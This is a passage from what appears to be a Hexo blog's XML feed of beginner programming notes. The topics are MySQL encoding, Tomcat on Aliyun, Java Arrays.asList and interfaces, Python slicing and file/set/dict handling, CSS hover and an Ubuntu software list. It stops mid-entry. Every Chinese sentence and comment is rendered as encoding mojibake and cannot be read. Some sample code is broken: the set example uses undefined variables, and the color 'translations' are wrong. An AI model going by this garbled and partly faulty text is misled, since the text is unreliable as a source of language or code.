        <content type="html"><![CDATA[<ol><li><p>mysqlÊüê‰∫∫ÁºñÁ†Å<br>È¶ñÂÖàË¶Å‰øùËØÅmysqlÈáåÈù¢ÁöÑÈªòËÆ§ÁºñÁ†ÅÊòØutf-8ÔºåÂèØËÉΩÊòØLatin1ÔºåÊâÄ‰ª•‰Ω†Ë¶ÅÊîπÊàêutf-8ÔºåÂ¶ÇÊûúÊï∞ÊçÆÂ∫ìÊñá‰ª∂‰∏çÈáçË¶ÅÁöÑËØùÔºåÂ∞±ÈáçË£ÖÂêßÔºåÂÆâË£ÖÁöÑ‰ºöÊèêÁ§∫ÈªòËÆ§ÁºñÁ†ÅÔºåÂ¶ÇÊûúÈáçË¶ÅÁöÑËØùÔºå‰Ω†ÊêúÊêúÁúãÔºåÂèØËÉΩÊúâ‰øÆÊîπÊñπÊ≥ï</p></li><li><p>pythonËøûÊé•Êï∞ÊçÆÂ∫ì </p></li></ol><pre><code>db=MySQLdb.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;*******&apos;,&apos;databaseName&apos;,charset=&apos;utf8&apos;)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂÖ¨ÁΩëËÆøÈóÆÈòøÈáå‰∫ëtomcat</title>
      <link href="/2017/05/30/%E5%85%AC%E7%BD%91%E8%AE%BF%E9%97%AE%E9%98%BF%E9%87%8C%E4%BA%91tomcat/"/>
      <url>/2017/05/30/%E5%85%AC%E7%BD%91%E8%AE%BF%E9%97%AE%E9%98%BF%E9%87%8C%E4%BA%91tomcat/</url>
      
        <content type="html"><![CDATA[<p>È¶ñÂÖà‰øÆÊîπservlet.xml<br>portÁ´ØÂè£‰øÆÊîπ‰∏∫80<br>ÁÑ∂ÂêéÊâìÂºÄÈòøÈáå‰∫ëÈáåÈù¢ÁöÑÁΩëÁªúÂíåÂÆâÂÖ®<br>-„ÄãÂÆâÂÖ®ÁªÑ-„ÄãÈÖçÁΩÆËßÑÂàô-„ÄãÊ∑ªÂä†ÂÆâÂÖ®ÁªÑËßÑÂàô<br>ÂÖ∑‰ΩìÈáåÈù¢ÁöÑÂçèËÆÆÁ±ªÂûãÔºöhttp80<br>ÊéàÊùÉÂØπË±°Ôºö0.0.0.0/0<br>ÁÑ∂ÂêéËøûÊé•‰∏Ä‰∏ãÔºåÂ∫îËØ•ÂèØ‰ª•ÊàêÂäü</p>]]></content>
      
      
      
        <tags>
            
            <tag> tomcat </tag>
            
            <tag> ÈòøÈáå‰∫ë </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux tomcatÂÖ∑‰ΩìÂÆâË£Ö</title>
      <link href="/2017/05/29/linux%20tomcat%E5%85%B7%E4%BD%93%E5%AE%89%E8%A3%85/"/>
      <url>/2017/05/29/linux%20tomcat%E5%85%B7%E4%BD%93%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>ÂÆâË£Ö<br><a href="http://blog.csdn.net/carlos1992/article/details/43085897" target="_blank" rel="noopener"> http://blog.csdn.net/carlos1992/article/details/43085897</a><br>‰ΩøÁî®Ôºö<br><a href="http://blog.csdn.net/liguu/article/details/41908529" target="_blank" rel="noopener"> http://blog.csdn.net/liguu/article/details/41908529</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> tomcat </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql ‰∏é java</title>
      <link href="/2017/04/27/mysql%20%E4%B8%8E%20java/"/>
      <url>/2017/04/27/mysql%20%E4%B8%8E%20java/</url>
      
        <content type="html"><![CDATA[<p>ÊúÄËøëÂú®windows‰∏ãÂ≠¶‰π†jdbc<br>1.mysql‰∏ãËΩΩ <a href="http://download.csdn.net/download/tan3739/8855049" target="_blank" rel="noopener"> http://download.csdn.net/download/tan3739/8855049</a><br>‰∏çÈúÄË¶ÅÁßØÂàÜÔºà0ÁßØÂàÜÔºâ<br>ÂÆâË£ÖÁöÑÊó∂ÂÄôÔºå‰∏ÄÁõ¥nextÂ∞±Ë°å‰∫Ü„ÄÇÂÖ∑‰ΩìÁöÑËá™Ë°åÁôæÂ∫¶</p><p>2.Âú®cmd.exeËøêË°åmysql<br>ÂÖàÈÖçÁéØÂ¢É <a href="http://jingyan.baidu.com/article/3ea51489e9998f52e61bbaf7.html" target="_blank" rel="noopener"> http://jingyan.baidu.com/article/3ea51489e9998f52e61bbaf7.html</a><br>ÁÑ∂ÂêéÁôªÈôÜÔºå<br>Âú®ÁªàÁ´ØÁôªÈôÜÔºömysql -h localhost -u root -pÂõûËΩ¶<br>ÁÑ∂Âêé‰ºöÊèêÁ§∫ËæìÂÖ•ÂØÜÁ†ÅÔºàËøô‰∏™Âú∞ÊñπÂèØËÉΩ‰ºöÊä•ÈîôÔºåÂèØËÉΩ‰Ω†ÁöÑmysqlÊ≤°ÊúâÂêØÂä®ÁöÑÂéüÂõ†Ôºâ<br>3.Âü∫Êú¨Êìç‰Ωú<br><a href="http://blog.csdn.net/duguduchong/article/details/8790719" target="_blank" rel="noopener"> http://blog.csdn.net/duguduchong/article/details/8790719</a><br>Âá†‰πé‰∏ÄÊ†∑ÔºåÂÖàcreate database XXXÔºåÁÑ∂Âêécreate tableÔºàÔºâÔºõ<br>4.‰∏éjava‰∫§‰∫í<br><a href="http://blog.csdn.net/haishu_zheng/article/details/50776439" target="_blank" rel="noopener"> http://blog.csdn.net/haishu_zheng/article/details/50776439</a><br><a href="http://blog.csdn.net/u013521637/article/details/48120955" target="_blank" rel="noopener"> http://blog.csdn.net/u013521637/article/details/48120955</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> java </tag>
            
            <tag> mysql </tag>
            
            <tag> windows </tag>
            
            <tag> jdbc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>listÂàáÁâá(know how to slice sequences)</title>
      <link href="/2017/03/08/list%E5%88%87%E7%89%87(know%20how%20to%20slice%20sequences)/"/>
      <url>/2017/03/08/list%E5%88%87%E7%89%87(know%20how%20to%20slice%20sequences)/</url>
      
        <content type="html"><![CDATA[<p>ÂàöËØª‰∫ÜEffective Python</p><hr><pre><code>a = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;]print(&apos;first four: &apos;,a[:4])#[&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;]print(&apos;Last four: &apos;,a[-4:])#[&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;]print(&apos;Middle two: &apos;,a[3:-3])#[&apos;d&apos;,&apos;e&apos;]</code></pre><hr><pre><code>assert a[:5] == a[0:5]assert a[5:] == a[5:len(a)]</code></pre><hr><pre><code>a[:20] # [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;]a[-20:] # [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;]  a[20] # IndexError: list index out of range</code></pre><hr><pre><code>a = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;]a[2:7] = [99,22,14]print(a) #[&apos;a&apos;,&apos;b&apos;,99,22,14,&apos;h&apos;]b = a[:]assert b == a and b is not ab = aassert a is b # still the same list object</code></pre><hr><p><em>avoid using start,end,and stride in a single slice</em><br>[ start: end: stride]</p><pre><code>a = [&apos;red&apos;,&apos;orange&apos;,&apos;yellow&apos;,&apos;green&apos;,&apos;blue&apos;,&apos;purple&apos;]odds = a[::2] # [&apos;red&apos;,&apos;yellow&apos;,&apos;blue&apos;]evens = a[1::2] # [&apos;orange&apos;,&apos;green&apos;,&apos;purple&apos;]x = b&apos;mongoose&apos;# type(x) &lt;class &apos;bytes&apos;&gt;(in python3)y = x[::-1]print(y)# b&apos;esoognom&apos;</code></pre><hr><pre><code>#specifying start, end, and stride in a slice can be extremely confusing#prefer using positive stride values in slice widthout start or end indexs.Avoid negative stride values if possible</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arrays.asList()</title>
      <link href="/2017/03/04/Arrays.asList()/"/>
      <url>/2017/03/04/Arrays.asList()/</url>
      
        <content type="html"><![CDATA[<pre><code>asListpublic static &lt;T&gt; List&lt;T&gt; asList(T... a)Returns a fixed-size list backed by the specified array. (Changes to the returned list &quot;write through&quot; to the array.) This method acts as bridge between array-based and collection-based APIs, in combination with Collection.toArray(). The returned list is serializable and implements RandomAccess.This method also provides a convenient way to create a fixed-size list initialized to contain several elements:     List&lt;String&gt; stooges = Arrays.asList(&quot;Larry&quot;, &quot;Moe&quot;, &quot;Curly&quot;);Parameters:a - the array by which the list will be backedReturns:a list view of the specified arrayasListpublic static &lt;T&gt; List&lt;T&gt; asList(T... a)ËøîÂõû‰∏Ä‰∏™ÂèóÊåáÂÆöÊï∞ÁªÑÊîØÊåÅÁöÑÂõ∫ÂÆöÂ§ßÂ∞èÁöÑÂàóË°®„ÄÇÔºàÂØπËøîÂõûÂàóË°®ÁöÑÊõ¥Êîπ‰ºö‚ÄúÁõ¥Êé•ÂÜô‚ÄùÂà∞Êï∞ÁªÑ„ÄÇÔºâÊ≠§ÊñπÊ≥ïÂêå Collection.toArray() ‰∏ÄËµ∑ÔºåÂÖÖÂΩì‰∫ÜÂü∫‰∫éÊï∞ÁªÑÁöÑ API ‰∏éÂü∫‰∫é collection ÁöÑ API ‰πãÈó¥ÁöÑÊ°•Ê¢Å„ÄÇËøîÂõûÁöÑÂàóË°®ÊòØÂèØÂ∫èÂàóÂåñÁöÑÔºåÂπ∂‰∏îÂÆûÁé∞‰∫Ü RandomAccess„ÄÇÊ≠§ÊñπÊ≥ïËøòÊèê‰æõ‰∫Ü‰∏Ä‰∏™ÂàõÂª∫Âõ∫ÂÆöÈïøÂ∫¶ÁöÑÂàóË°®ÁöÑ‰æøÊç∑ÊñπÊ≥ïÔºåËØ•ÂàóË°®Ë¢´ÂàùÂßãÂåñ‰∏∫ÂåÖÂê´Â§ö‰∏™ÂÖÉÁ¥†Ôºö     List&lt;String&gt; stooges = Arrays.asList(&quot;Larry&quot;, &quot;Moe&quot;, &quot;Curly&quot;);ÂèÇÊï∞Ôºöa - ÊîØÊåÅÂàóË°®ÁöÑÊï∞ÁªÑ„ÄÇËøîÂõûÔºöÊåáÂÆöÊï∞ÁªÑÁöÑÂàóË°®ËßÜÂõæ„ÄÇ</code></pre><hr><pre><code>import java.util.Arrays;import java.util.List;public class AddingGroups {    public static void main(String[] args) {        List&lt;Integer&gt; list = Arrays.asList(16,17,18);        System.out.println(list);        //list.add(11); underlying array cannot be resized    }}</code></pre><hr><pre><code>import java.util.*;public class ModifyingArraysAsList {    public static void main(String[] args) {        Random rand = new Random(47);        Integer[] ia = {1,2,3,4,5,6,7,8,9,10};        List&lt;Integer&gt; list1 = new ArrayList&lt;Integer&gt;(Arrays.asList(ia));//ArrayList(Collection &lt;? extends E&gt; c)        System.out.println(&quot;Before shuffing: &quot; + list1);        Collections.shuffle(list1,rand);        System.out.println(&quot;After shuffling: &quot; + list1);        System.out.println(&quot;array: &quot; + Arrays.toString(ia));//ÊâìÂç∞Êï∞ÁªÑ        List&lt;Integer&gt; list2 = Arrays.asList(ia);        System.out.println(&quot;before shuffling : &quot; + list2);        Collections.shuffle(list2,rand);        System.out.println(&quot;After shuffing : &quot; + list2);        System.out.println(&quot;array : &quot; + Arrays.toString(ia));           }}//Arrays.asList()‰∫ßÁîüÁöÑListÁöÑÂØπË±°‰ºö‰ΩøÁî®Â∫ïÂ±ÇÊï∞ÁªÑ‰Ωú‰∏∫ÂÖ∂Áâ©ÁêÜÂÆûÁé∞ÊòØÂæàÈáçË¶ÅÁöÑÔºåÂè™Ë¶Å‰Ω†ÊâßË°åÁöÑÊìç‰ΩúÁöÑ‰øÆÊîπËøô‰∏™ListÔºåÂπ∂‰∏î‰Ω†‰∏çÊÉ≥ÂéüÊù•ÁöÑÊï∞ÁªÑË¢´‰øÆÊîπÔºåÈÇ£‰πà‰Ω†Â∞±Â∫îËØ•Âú®Âè¶‰∏Ä‰∏™ÂÆπÂô®‰∏≠ÂàõÂª∫‰∏Ä‰∏™ÂâØÊú¨„ÄÇ</code></pre><p>Before shuffing: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]<br>After shuffling: [4, 6, 3, 1, 8, 7, 2, 5, 10, 9]<br>array: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]<br>before shuffling : [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]<br>After shuffing : [9, 1, 6, 3, 7, 2, 5, 10, 4, 8]<br>array : [9, 1, 6, 3, 7, 2, 5, 10, 4, 8]</p><hr><pre><code>import java.util.*;public class ArrayIsNotIterable {    public static void main(String[] args) {        Integer[] ia = {1,2,3,4,5,6,7,8,9};        List&lt;Integer&gt; list = Arrays.asList(ia);        list.set(1, 0);        for(Integer x : ia){            System.out.print(x + &quot;\t&quot;);        }        System.out.println();        System.out.print(&quot;list : &quot; + list);    }}</code></pre><p>1 0 3 4 5 6 7 8 9<br>list : [1, 0, 3, 4, 5, 6, 7, 8, 9]</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonÁ®ãÂ∫èËÆæËÆ°~Êï∞ÊçÆÂ§ÑÁêÜÂ≠¶‰π†</title>
      <link href="/2017/02/19/Python%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1~%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/02/19/Python%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1~%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>1.read file</p><pre><code>infile = open(fileName,&apos;r&apos;)#for line in infile:#ÈÅçÂéÜÊñá‰ª∂listVar = [line.rstrip() for line in infile]Â∞ÜÊØè‰∏ÄË°åÁîüÊàêÂàóË°®strVar =  infile.read()#ËØªÂèñÊñá‰ª∂ÂÖ®ÈÉ®ÂÜÖÂÆπÁΩÆ‰∫é‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤strVar = infile.readline()#ËØªÂèñÂΩìÂâçÊåáÈíàÊåáÂêëÁöÑÈÇ£‰∏ÄË°åÔºåÂàöÂºÄÂßãÊòØÁΩÆ‰∫éÊñá‰ª∂Á¨¨‰∏ÄË°åÔºåÊâßË°åËØ≠Âè•ÂêéÔºåÂ∞ÜÁΩÆ‰∫éÊú´Â∞æ„ÄÇÂáÜÂ§áËØªÂèñ‰∏ã‰∏ÄË°åinfile.close()#close fileTest.txtÊñá‰ª∂‰∏≠ÂÜÖÂÆπÂ¶Ç‰∏ãGoogleBaiduYahooÂÖ∂ÂÆûÊòØ‰ª•‰∏ãÁöÑÊñπÂºèGoogle\nBaidu\nYahoo\n</code></pre><p>2.create file</p><pre><code>outfile = open(fileName,&apos;w&apos;)outfile.write(strVar)outfile.writelines(strVar)#file.write(str)ÁöÑÂèÇÊï∞ÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåÂ∞±ÊòØ‰Ω†Ë¶ÅÂÜôÂÖ•Êñá‰ª∂ÁöÑÂÜÖÂÆπ.#file.writelines(sequence)ÁöÑÂèÇÊï∞ÊòØÂ∫èÂàóÔºåÊØîÂ¶ÇÂàóË°®ÔºåÂÆÉ‰ºöËø≠‰ª£Â∏Æ‰Ω†ÂÜôÂÖ•Êñá‰ª∂.outfile.close()</code></pre><p>3.opened for append</p><pre><code>outfile = open(fileName,&apos;a&apos;)#ÊâìÂºÄÊñá‰ª∂Âú®Êñá‰ª∂Êú´Â∞æÊ∑ªÂä†outfile.write(strVar)outfile.writelines(strVar)outfile.close()</code></pre><p>4.set<br>listÂàóË°®ÊòØÂÖÉÁ¥†ÁöÑÈ°∫Â∫èÂ≠òÂÇ®ÂÆπÂô®ÔºåËÄå‰∏îÂÖÅËÆ∏ÂÖÉÁ¥†ÈáçÂ§ç<br>setÈõÜÂêàÊòØÂÖÉÁ¥†ÁöÑÊó†Â∫èÂ≠òÂÇ®ÂÆπÂô®Ôºå‰∏çÂÖÅËÆ∏ÂÖÉÁ¥†ÈáçÂ§ç</p><pre><code>{&quot;spam&quot;,&quot;ni&quot;},{3,4,7},{True,7,&quot;eleven&quot;},{&apos;a&apos;,&apos;b&apos;,(3,4)}#‰ª•‰∏äÈÉΩÊòØset#ÈõÜÂêàÊìç‰Ωúword = {&quot;spam&quot;,&quot;ni&quot;}set.add()#word.add(&quot;eggs&quot;)#words = {&quot;spam&quot;,&quot;ni&quot;,&quot;eggs&quot;}set.discard()#discard‰∏¢ÂºÉÔºåÊäõÂºÉ; Ëß£Èõá; Âá∫Áâå;word.discard(&quot;ni&quot;)words = {&quot;spam&quot;}set.clear()#words.clear() words = {}set#set([3,7,3])#{3,7}set#set((3,7,3))#{7,3}{x*x for x in range(-3,3)}#{0,1,4,9}set1.union(set2)#set1‚à™set2set1.intersection(set2)#set1‚à©set2set1.difference(set2)#set1-set2File1.txtAlphaBravoCharlieFile2.txtBravoDeltadef main():    infile = open(&quot;File1.txt&quot;,&apos;r&apos;)    firstSet = {line.rstrip() for line in infile}    infile.close()    infile = open(&quot;File2.txt&quot;,&apos;r&apos;)    firstSet = {line.rstrip() for line in infile}    infile.close()    outfile = open(&quot;Union.txt&quot;,&apos;w&apos;)    outfile.writelines(set1.union(set2))    outfile.close()    outfile = open(&quot;Intersection.txt&quot;,&apos;w&apos;)    outfile.writelines(set1.intersection(set2))    outfile.close()    outfile = open(&quot;Difference.txt&quot;,&apos;w&apos;)    outfile.writelines(set1.difference(set2))    outfile.close()main()Union.txt#Alpha,Bravo,Charlie,DeltaIntersection.txt#BravoDifference.txt#Alpha,Charlie</code></pre><p>5.csvÊñá‰ª∂<br>Â∞ÜÊï∞ÊçÆ‰ª•ÈÄóÂè∑ÂàÜÈöîÔºàÂΩìÁÑ∂‰πüÂèØ‰ª•‰∏çÊòØÈÄóÂè∑Ôºâ<br>Ë≠¨Â¶ÇcsvDemo.csv<br>name,passwd,age,address<br>zhangsan,123456,15,sichuang<br>lisiÔºå45612,15Ôºåjiangshu<br>ÂèØ‰ª•Âú®excel‰∏≠ÊâìÂºÄ</p><pre><code>UN.txtCanada,North America,34.8,385500France,Europe,66.3,211209New Zealand,Austrlia/Oceania,4.4,103738Nigeria,Africa,177.2,356669Pakistan,Asia,196.2,310403Peru,South America,30.1,496226#-----------------def main():continent = input(&quot;Enter the name of a continent:&quot;)continent = continent.title()#Allow for all lowercase lettersif continent != &apos;Antarctica&apos;:    infile = open(&quot;UN.txt&quot;,&apos;r&apos;)    for line in infile:        data = line.split(&apos;,&apos;)        if data[1] == continent:            print(data[0])else:    print(&quot;There are no counteries in Antarctica&quot;)#-------Enter the name of a continent:North AmericaCanada</code></pre><p>6.dictÂ≠óÂÖ∏</p><pre><code>bob = {&quot;firstName&quot;:&quot;Robert&quot;,&quot;lastName&quot;:&quot;Smith&quot;,&quot;age&quot;:19}print(bob[&quot;firstName&quot;],bob[&quot;lastName&quot;],&quot;is&quot;,bob[&quot;age&quot;],&quot;years old.&quot;)[RUN]Robert Smith is 19 years old.</code></pre><p>dictÊìç‰Ωú</p><pre><code>len(d)#Â≠óÂÖ∏‰∏≠ÂÖÉÁ¥†(ÈîÆÂÄºÂØπ)ÁöÑ‰∏™Êï∞x in d#Â¶ÇÊûúxÊòØÂ≠óÂÖ∏ÁöÑ‰∏Ä‰∏™ÈîÆÔºåËøîÂõûTruex:y in d#Â¶ÇÊûúx:yÊòØÂ≠óÂÖ∏‰∏≠ÁöÑÂÖÉÁ¥†ÔºåËøîÂõûTrue#not ind[key1] = value1#ËøîÂõûkey1ÂØπÂ∫îÁöÑÂÄºÔºåÂê¶ËÄÖÊäõÂá∫ÂºÇÂ∏∏d.get(key1,default)#Â¶ÇÊûúÂ≠òÂú®key1ÂàôËøîÂõûvalue1ÔºåÂê¶ËÄÖËøîÂõûdefaultlist(d.keys())#ËøîÂõûÂ≠óÂÖ∏ÈîÆÁªÑÊàêÁöÑlistlist(d.values())#ËøîÂõûÂ≠óÂÖ∏ÂÄºÁªÑÊàêÁöÑlistlist(d.items())#ËøîÂõû(key,value)ÂΩ¢ÊàêÁöÑ‰∫åÂÖÉÁªÑÁªÑÊàêÁöÑÂàóË°®ÔºåÂÖ∂‰∏≠d[key]=valuelist(d)#set(d)#tuple(d)#ËøîÂõûÂ≠óÂÖ∏ÁöÑÈîÆÁªÑÊàêÁöÑÂàóË°®ÔºåÈõÜÂêàÔºåÂÖÉÁªÑc = {}#ÂàõÂª∫‰∏Ä‰∏™Â≠óÂÖ∏c = dict(d)#ÂàõÂª∫Â≠óÂÖ∏dÁöÑ‰∏Ä‰∏™Êã∑Ë¥ùd.update(c)#Â∞ÜÂ≠óÂÖ∏cÊâÄÊúâÁöÑÂÖÉÁ¥†ÂêàÂπ∂ÂÖ•Â≠óÂÖ∏d„ÄÇÂ¶ÇÊûú‰∏§‰∏™ÂÖÉÁ¥†Êã•ÊúâÁõ∏ÂêåÁöÑÈîÆÔºåÂàô‰ΩøÁî®c‰∏≠ÁöÑÂÄºÊõøÊç¢d‰∏≠ÁöÑÂÄº</code></pre><p>ÂÆû‰æã</p><pre><code>eg 1:def translate(color):#Ëã±ËØ≠ÁøªËØëÊàêÊÑèÂ§ßÂà©ËØ≠    if color == &quot;red&quot;:        return &quot;rojo&quot;    elif color == &quot;blue&quot;:        return &quot;aloz&quot;    elif color == &quot;green&quot;:        return &quot;verdi&quot;    elif color == &quot;white&quot;:        return &quot;blanco&quot;#-----translate = {&quot;red&quot;:&quot;rojo&quot;,&quot;blue&quot;:&quot;aloz&quot;,&quot;green&quot;:&quot;verdi&quot;,&quot;white&quot;:&quot;blanco&quot;}eg 2:list1 = [[&quot;one&quot;,1],[&quot;two&quot;,2],[&quot;three&quot;,3]]Êàñlist1 = [(&quot;one&quot;,1),(&quot;two&quot;,2),(&quot;three&quot;,3)]dict(list1){&quot;one&quot;:1,&quot;two&quot;:2,&quot;three&quot;:3}eg 3:Textese.txtanyone,neiare,rate,8band,b&amp;be,b#-----def main():    texteseDict = createDictionary(&quot;Textese.txt&quot;)    print(&quot;Enter a simple sentence in lowercase letters without&quot;)    sentence = input(&quot;any punctuation: &quot;)    print()    translate(sentence,texteseDict)def createDictionary(fileName):    infile = open(fileName,&apos;r&apos;)    textList = [line.rstrip() for line in infile]    infile.close()    return dict([var.split(&apos;,&apos;) for var in textList])def translate(sentence,texteseDict):    words = sentence.split()    for word in words:        print(texteseDict.get(word,word)+&quot; &quot;,end = &quot; &quot;)main()</code></pre><hr><p>ËÄóÊó∂2hÂÜôÂ•Ω</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Êï∞ÊçÆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pycharm‰∏≠‰øÆÊîπpythonÁâàÊú¨</title>
      <link href="/2017/01/05/pycharm%E4%B8%AD%E4%BF%AE%E6%94%B9python%E7%89%88%E6%9C%AC/"/>
      <url>/2017/01/05/pycharm%E4%B8%AD%E4%BF%AE%E6%94%B9python%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>File-&gt;Settings-&gt;project:XXX-&gt;Project Interpreter</p><p>may be you can happy more</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hover</title>
      <link href="/2016/12/18/hover/"/>
      <url>/2016/12/18/hover/</url>
      
        <content type="html"><![CDATA[<p>ÂΩìÈº†Ê†áÁßªÂä®Âà∞ÂÖÉÁ¥†‰∏äÊó∂ÔºåÂèòÂèòÈ¢úËâ≤‰ªÄ‰πàÁöÑÔºåÂèØ‰ª•Áî®hoverÔºåhoverÂèØ‰ª•Âíå‰ªª‰ΩïÂÖÉÁ¥†Êê≠ÈÖçÔºåÂè™ÊòØÈÄöÂ∏∏Âíåa:hoverÔºå‰ΩÜÊòØÂàöÂàöÁî®Âà∞‰∫Üul li:hover{</p><pre><code>#left ul li{border-bottom:1px solid #999; background-image:url(images/bullet-green.gif); background-repeat:no-repeat;width:150px; margin-left:0px; text-align:center; }#left a{color:black; font-weight: bold;}#left ul li:hover{background-image: url(images/bullet-red.gif);background-repeat: no-repeat;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu‰∏ãÈÖçÁΩÆ</title>
      <link href="/2016/11/28/ubuntu%E4%B8%8B%E9%85%8D%E7%BD%AE/"/>
      <url>/2016/11/28/ubuntu%E4%B8%8B%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<ol><li>Chrome </li><li>Android Studio </li><li>Eclipse </li><li>Sublime Text </li><li>WebStorm jetBrainsÊ≥®ÂÜåÁ†Å </li><li>PyCharm </li><li>CLion </li><li>ÁΩëÊòì‰∫ëÈü≥‰πê </li><li>Unity Tweak Tool ‰∏ªÈ¢òNumix Numix daily Flatabulous ÂõæÊ†ánumix-circle-light </li><li>IDLE </li><li>KchmViewer ÁúãchmÊñá‰ª∂ </li><li>12. </li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaÊé•Âè£interface</title>
      <link href="/2016/11/23/java%E6%8E%A5%E5%8F%A3interface/"/>
      <url>/2016/11/23/java%E6%8E%A5%E5%8F%A3interface/</url>
      
        <content type="html"><![CDATA[<ol><li>‰ª£Á†Å </li></ol><pre><code>package Interface;public class InterfaceDemo {    public static void main(String[] args) {        //System.out.println(IAbility.number);        //System.out.println(IAbility.number++);        //The final field IAbility.number cannot be assignedËµãÂÄº        Person person=new Person();        IAbility iability1=new Child();        IAbility iability2=new Dog();        person.feed(iability1);        person.feed(iability2);        if(iability1 instanceof Child){            Child children = (Child)iability1;            children.hhh();        }        Dog dog = new Dog();        Child child = new Child();        person.feed(dog);        person.feed(child);    }}class Person{    /*    public void feed(Child child){        child.eat();    }    public void feed(Dog dog){        dog.eat();    }*/    //interface     public void feed(IAbility ability){        ability.eat();//dongtai bangding    }}interface IAbility{    //public static final int number = 1;//int  number = 1;default number is public static final     /*public abstract*//* void show();*///void show();default is public abstract    public abstract void eat();        }class Child implements IAbility{    @Override    public void eat(){        System.out.println(&quot;eat rice&quot;);    }    public void hhh(){        System.out.println(&quot;nihao&quot;);    }}class Dog implements IAbility{    @Override    public void eat(){        System.out.println(&quot;eat bone&quot;);    }}</code></pre><hr><pre><code>interface Action{    int number = 1;//public static final int number = 1;    /*‰∏§‰∏™ÊÑèÊÄùÊòØ‰∏ÄÊ†∑ÁöÑ*/    public void eat();/*public abstract void eat();*/       }/*‰∏∫‰ªÄ‰πàÁî®Âà∞interface,Âõ†‰∏∫childÂíådogÁ±ªÂπ∂Ê≤°ÊúâÁâπÂÆöÁöÑÁà∂Á±ª,ËÄå‰ªñ‰ª¨ÁöÑÊñπÊ≥ïÂèØ‰ª•ÈÄöËøáÊé•Âè£ÂÆûÁé∞*/</code></pre><hr><p>1. <strong>Â≠êÁ±ªÂú®ÈÄâÊã©ÊäΩË±°Á±ªËøòÊòØÊé•Âè£,ÊòØÊäΩË±°Á±ªÊòØ‰∏ÄÁßçis-a,ËÄåÊé•Âè£ÊòØlike-a</strong><br>2. _Â≠êÁ±ªÂèØ‰ª•Êúâ <strong>Â§ö‰∏™</strong> Êé•Âè£(extends),‰ΩÜÂè™Êúâ‰∏Ä‰∏™Áà∂Á±ª(ÊôÆÈÄöÁ±ªÊàñÊäΩË±°Á±ª)(implements) _</p><hr><p><strong>‰ª•‰∏ã ÊòØÊù•Ëá™‰∏Ä‰∏™Â§ß‰Ω¨ÁöÑÂØπabstract classÂíåinterfaceÊ∑±ÂÖ•ÁêÜËß£</strong><br>[ Â§ß‰Ω¨ÁöÑÁêÜËß£ ](<a href="https://www.ibm.com/developerworks/cn/java/l-javainterface-" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/java/l-javainterface-</a><br>abstract/)</p><pre><code>/*ÁõÆÁöÑ:ÂÆâÂÖ®Èó®*/1.abstract class Door {        abstract void open();        abstract void close()Ôºõ        abstract void alarm();}class AlarmDoor extends Door {        void open() { ‚Ä¶ }            void close() { ‚Ä¶ }        void alarm() { ‚Ä¶ }}2.interface Door {        void open();    void close();    void alarm();}class AlarmDoor implements Door ÔΩõ    void open() { ‚Ä¶ }            void close() { ‚Ä¶ }        void alarm() { ‚Ä¶ }ÔΩùËøôÁßçÊñπÊ≥ïËøùÂèç‰∫ÜÈù¢ÂêëÂØπË±°ËÆæËÆ°‰∏≠ÁöÑ‰∏Ä‰∏™Ê†∏ÂøÉÂéüÂàôISPÔºàInterface Segregation 